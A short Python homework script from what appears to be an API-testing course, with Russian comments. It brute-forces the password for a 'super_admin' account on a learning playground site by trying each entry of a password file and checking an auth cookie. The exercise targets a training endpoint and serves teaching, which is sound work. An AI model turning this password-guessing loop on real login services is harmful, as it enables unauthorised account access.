# _____ task #5 ______
import requests
print('---- LESSON 2 ----')
print ('_____ task #5 ______')
try:
    newpass = open('pass_out.txt', 'r')            # Берем файлик с паролями, отобранными скриптом get_passwords.py
    password_list = newpass.read()
    password: list[str] = password_list.split()     # Парсим файлик на слова и загоняем в массив чтобы работать с любыми списками, не только построчными
    i = 0
    status_ok = False
    while status_ok == False:
        logopass = {'login':'super_admin', 'password':password[i]}
        response = requests.post('https://playground.learnqa.ru/ajax/api/get_secret_password_homework', data = logopass)
        cookies = response.cookies
        response_cookie = requests.get('https://playground.learnqa.ru/ajax/api/check_auth_cookie', cookies = cookies)

        if response_cookie.status_code == 200 and response_cookie.text == 'You are NOT authorized':
            i += 1
        elif response_cookie.status_code == 200 and response_cookie.text == 'You are authorized':
            status_ok = True
        else:
            i +=1

    newpass.close()
    print('Ваш пароль: ',password[i])
    print('Ответ: ', response_cookie.text)
    print('Ваша кука: ', response.cookies)
except FileNotFoundError:
    print(f"Запрашиваемый файл 'pass_out.txt' не найден")